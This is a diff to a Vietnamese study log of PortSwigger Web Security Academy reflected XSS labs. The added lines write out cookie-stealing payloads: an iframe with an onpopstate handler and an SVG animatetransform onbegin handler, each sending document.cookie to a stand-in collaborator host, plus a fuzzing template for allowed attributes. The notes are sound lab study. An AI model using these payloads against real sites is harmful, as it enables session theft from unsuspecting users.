@@ -425,8 +425,41 @@ hoặc
 ```code
 <iframe src="https://0ace00f5048b2f61800280f600a1003a.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E%22%20onload=this.style.width=%27100px%27%3E" onload=this.style.width='100px'>
 ```
+Đoạn code dưới đây cũng là payload có thể tham khảo 
+```code
+<iframe onload="if(!window.flag){this.contentWindow.location='https://TARGET.net?search=<body onpopstate=document.location=`http://OASTIFY.COM/?`+document.cookie>#';flag=1}" src="https://TARGET.net?search=<body onpopstate=document.location=`http://OASTIFY.COM/?`+document.cookie>"></iframe>
+```
+### Reflected XSS with some SVG markup allowed
 
-- [ ] **29/4** — Reflected XSS with some SVG markup allowed
+
+This case is missing SVG tag 
+
+Khi phát hiện svg tag trả về 200 tiến hành fuzz như sau 
+
+```code
+<svg><animatetransform%20§§=1>
+```
+
+[Payload copy event ở](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) 
+
+Onbegin ok 
+
+Payload như sau 
+
+```code
+https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E
+
+
+khi gửi đến victim đưa vào iframe 
+
+<iframe src="https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E">
+</iframe>
+```
+
+![alt text](image-38.png)
+
+
+
 - [ ] **30/4** — Reflected XSS into HTML context with nothing encoded
 - [ ] **1/5** — Reflected XSS into HTML context with all tags blocked except custom ones
 - [ ] **2/5** — DOM XSS in jQuery selector sink using a hashchange event
